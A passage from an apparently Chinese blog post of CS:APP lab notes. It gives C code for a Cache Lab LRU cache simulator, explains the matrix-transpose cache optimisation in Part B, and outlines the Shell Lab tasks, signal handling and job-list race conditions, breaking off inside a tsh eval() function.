class="keyword">char</span>* argv[])</span></span>;  <span class="comment">//print the help messages</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span></span>; <span class="comment">//init caches</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span></span>; <span class="comment">//free caches</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if hit return the index of memory</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if there is any empty memort return it&#x27;s index</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//store</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//modify: once store and once load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> s, E, b;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];   <span class="comment">//store the name of the file</span></span><br><span class="line"><span class="keyword">int</span> verbosity = <span class="number">0</span>;</span><br><span class="line">Cache cache;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">while</span> ((ch = getopt(argc, argv, <span class="string">&quot;vs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (ch) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">verbosity = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">s = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">E = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">b = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">printUsage(argv);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line"><span class="built_in">strcpy</span>(buf, optarg);<span class="comment">//copy the address of trace to file</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !s || !E || !b ) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: Missing required command line argument\n&quot;</span>, *argv);</span><br><span class="line">printUsage(argv);</span><br><span class="line">&#125;</span><br><span class="line">initCache(s, E, b, &amp;cache);</span><br><span class="line">replayTrace(s, E, b, buf, verbosity, &amp;cache);</span><br><span class="line">freeCache(&amp;cache);</span><br><span class="line">printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Options:&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -h         Print this help message.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -v         Optional verbose flag.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -t &lt;file&gt;  Trace file.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\nExamples:&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cache-&gt;S = <span class="built_in">pow</span>(<span class="number">2.0</span>, s); <span class="comment">// get the sets</span></span><br><span class="line">cache-&gt;E = E;</span><br><span class="line">cache-&gt;sets = (Cache_set*)<span class="built_in">malloc</span>(cache-&gt;S * <span class="keyword">sizeof</span>(Cache_set));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line">cache-&gt;sets[i].lines = (Cache_line*)<span class="built_in">malloc</span>(E * <span class="keyword">sizeof</span>(Cache_line));</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; cache-&gt;E; j++) </span><br><span class="line">&#123;<span class="comment">//init every cache line</span></span><br><span class="line">cache-&gt;sets[i].lines[j].valid_bit = <span class="number">0</span>;</span><br><span class="line">cache-&gt;sets[i].lines[j].LRU_count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line"><span class="built_in">free</span>(cache-&gt;sets[i].lines); </span><br><span class="line">cache-&gt;sets[i].lines = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(cache-&gt;sets);</span><br><span class="line">cache-&gt;sets = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123; <span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">int</span> hitIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">1</span> &amp;&amp; cache-&gt;sets[setIndex].lines[i].tag == tag)&#123; <span class="comment">// valid and the tag matches</span></span><br><span class="line">            hitIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hitIndex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123;<span class="comment">//find whether there is an empty line in the given set</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> emptyIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;E; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">0</span>) &#123;</span><br><span class="line">            emptyIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> emptyIndex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> hitIndex = getHitIndex(cache, setIndex, tag);<span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">if</span> (hitIndex == <span class="number">-1</span>) &#123; <span class="comment">//one miss</span></span><br><span class="line">        miss_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbosity) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">int</span> emptyIndex = getEmptyIndex(cache, setIndex, tag);     </span><br><span class="line">        <span class="keyword">if</span> (emptyIndex == <span class="number">-1</span>) &#123;<span class="comment">//need eviction </span></span><br><span class="line">            eviction_count++;</span><br><span class="line">            <span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;eviction &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count == cache-&gt;E - <span class="number">1</span> &amp;&amp; flag==<span class="number">1</span>)&#123; <span class="comment">//find the least recent used line, and other line LRU_count++</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">                &#125; </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span class="comment">//it is not used this time</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;  <span class="comment">// don&#x27;t need eviction</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != emptyIndex)&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span class="comment">//it is not used this time</span></span><br><span class="line">                &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;<span class="comment">//one hit                        </span></span><br><span class="line">        hit_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tempLRU_count = cache-&gt;sets[setIndex].lines[hitIndex].LRU_count;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != hitIndex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count &lt;  tempLRU_count) &#123;<span class="comment">//less than the hit one&#x27;s LRU</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;<span class="comment">// the hit one&#x27;s LRU is set to zero</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">//store is just like a load</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">// a write is just like one load then one store</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">    store(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span> </span>&#123;</span><br><span class="line">FILE *file;                        <span class="comment">// pointer to FILE object </span></span><br><span class="line">file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> type;                          <span class="comment">// L-load S-store M-modify </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> address;              <span class="comment">// 64-bit  memory address </span></span><br><span class="line"><span class="keyword">int</span> size;                           <span class="comment">//number of bytes accessed by operation </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tag_move_bits = b + s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot; %c %lx,%d&quot;</span>, &amp;type, &amp;address, &amp;size) &gt; <span class="number">0</span>) &#123;<span class="comment">//for every line in the file</span></span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">//if it is an instruction, do nothing</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> tag = address &gt;&gt; tag_move_bits;<span class="comment">//get the tag</span></span><br><span class="line"><span class="keyword">int</span> setIndex = (address &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>);<span class="comment">//get the index</span></span><br><span class="line"><span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;<span class="comment">//print detailed info</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c %lx,%d &quot;</span>, type, address, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;S&#x27;</span>) &#123;</span><br><span class="line">store(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">modify(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type== <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">load(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h4><p>首先要明确，尽管矩阵的转置本身导致对于A矩阵（原始矩阵）的读和B矩阵（转置矩阵）的写不可能同时为连续的（即不可能同时存在连续读和连续写——对A矩阵行的连续读必然导致对B矩阵列的非连续写）。<br>但只要矩阵的大小小于缓存的总大小，那么在理想的情况下，在最初的强制不命中（即缓存为空导致的不命中）后，整个矩阵都会被加载进入缓存。在这之后的所有对于B矩阵的不连续写的引用都会命中。</p><p><strong>在该实验中</strong>，缓存采用的是直接映射高速缓存，s = 5，b = 5，E = 1。对于该缓存，总共存在32个组，每个组共32个字节，可以装入8个int型变量，是非常有限的缓存，主要需要解决以下两个问题：</p><ol><li>直接映射缓存所带来的冲突不命中。观察程序中矩阵存储的位置即可以发现，矩阵A和矩阵B的同一行实际上被映射到了同一个缓存组。当进行对角线的引用时，一定会发生缓存的冲突不命中。需要仔细地处理对角线上的元素。</li><li>所需优化的矩阵的总大小超出了缓存的总大小。必然导致程序的访存效率低下。</li></ol><p>代码见GitHub。</p><blockquote><p>参考：</p><p><a href="https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</a></p></blockquote><h3 id="Shell-Lab"><a href="#Shell-Lab" class="headerlink" title="Shell Lab"></a>Shell Lab</h3><p>任务：</p><ul><li><p>eval: 主要功能是解析cmdline，并且运行. [70 lines]</p></li><li><p>builtin cmd: 辨识和解析出bulidin命令: quit, fg, bg, and jobs. [25lines]</p></li><li><p>do bgfg: 实现bg和fg命令. [50 lines]</p></li><li><p>waitfg: 实现等待前台程序运行结束. [20 lines]</p></li><li><p>sigchld handler: 响应SIGCHLD. 80 lines]</p></li><li><p>sigint handler: 响应 SIGINT (ctrl-c) 信号. [15 lines]</p></li><li><p>sigtstp handler: 响应 SIGTSTP (ctrl-z) 信号. [15 lines]</p></li></ul><p>给出的函数：</p><ul><li><code>int parseline(const char *cmdline,char **argv)</code>：获取参数列表<code>char **argv</code>，返回是否为后台运行命令（<code>true</code>）。</li><li><code>void clearjob(struct job_t *job)</code>：清除<code>job</code>结构。</li><li><code>void initjobs(struct job_t *jobs)</code>：初始化<code>jobs</code>链表。</li><li><code>void maxjid(struct job_t *jobs)</code>：返回<code>jobs</code>链表中最大的<code>jid</code>号。</li><li><code>int addjob(struct job_t *jobs,pid_t pid,int state,char *cmdline)</code>：在<code>jobs</code>链表中添加<code>job</code></li><li><code>int deletejob(struct job_t *jobs,pid_t pid)</code>：在<code>jobs</code>链表中删除<code>pid</code>的<code>job</code>。</li><li><code>pid_t fgpid(struct job_t *jobs)</code>：返回当前前台运行<code>job</code>的<code>pid</code>号。</li><li><code>struct job_t *getjobpid(struct job_t *jobs,pid_t pid)</code>：返回<code>pid</code>号的<code>job</code>。</li><li><code>struct job_t *getjobjid(struct job_t *jobs,int jid)</code>：返回<code>jid</code>号的<code>job</code>。</li><li><code>int pid2jid(pid_t pid)</code>：将<code>pid</code>号转化为<code>jid</code>。</li><li><code>void listjobs(struct job_t *jobs)</code>：打印<code>jobs</code>。</li><li><code>void sigquit_handler(int sig)</code>：处理<code>SIGQUIT</code>信号。</li></ul><p>tsh应有的内置命令：</p><ul><li>quit: 退出当前shell</li><li>jobs: 列出所有后台运行的工作</li><li>bg <job>: 这个命令将会向<job>代表的工作发送SIGCONT信号并放在后台运行，<job>可以是一个PID也可以是一个JID（job ID）。</li><li>fg <job>: 这个命令会向<job>代表的工作发送SIGCONT信号并放在前台运行，<job>可以是一个PID也可以是一个JID</li></ul><blockquote><p>信号阻塞：</p><p>执行信号的处理动作成为信号递达（Delivery），信号从产生到递达之间的状态称为信号未决(Pending)。进程可以选择阻塞(Block)某个信号。<br>被阻塞的信号产生时将保持在未决状态，直到进程解除对此信号的阻塞，才执行递达的动作<br>注意：阻塞和忽略是不同的，只要信号被阻塞就不会递达，而忽略是在递达之后可选的一种处理动作<br>信号不会丢失，如果信号被阻塞，只会保持信号未决，但是信号不丢失</p></blockquote><p>对用户输入的参数进行解析并运行计算。书上已经给了 demo，我们优化一下即可。</p><p>有以下几点需要注意：</p><ul><li><code>SIGCHLD</code>信号：只要有一个子进程终止或者停止，内核就会发送一个 <code>SIGHLD</code>信号给父进程。</li><li>信号是不排队的。如果返回信号时，发现目的进程正在执行信号处理，那么该信号则会被阻塞，下一个则会被丢弃。因此，不能用信号来对其他进程中发生的事件计数。</li><li><strong>条件竞争</strong>：条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。本例情况是，如果在<strong>父进程</strong>能够再次运行之前，子进程终止，返回信号，而此时父进程还没执行 <code>addjob</code>，而信号处理回收子进程，执行 <code>deletejob</code>，由于还没添加到列表，所以这个函数什么都做不了，而这结束后父进程又会添加子进程，而产生一个永远不会被删除的job。</li></ul><p>代码参考tshref 源码：</p><p><a href="https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c">https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS]; <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];   <span class="comment">/* Holds modified command line */</span></span><br><span class="line">    <span class="keyword">int</span> bg;              <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;           <span class="comment">/* Process id */</span></span><br><span class="line">    <span class="keyword">int</span> state = UNDEF;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv); <span class="comment">//解析命令</span></span><br><span class="line">    <span class="keyword">if</span>(bg == <span class="number">1</span>) &#123; <span class="comment">//判断是否在后台</span></span><br><span class="line">        state = BG;</span><br><span class="line">    &#125;</span><br><span 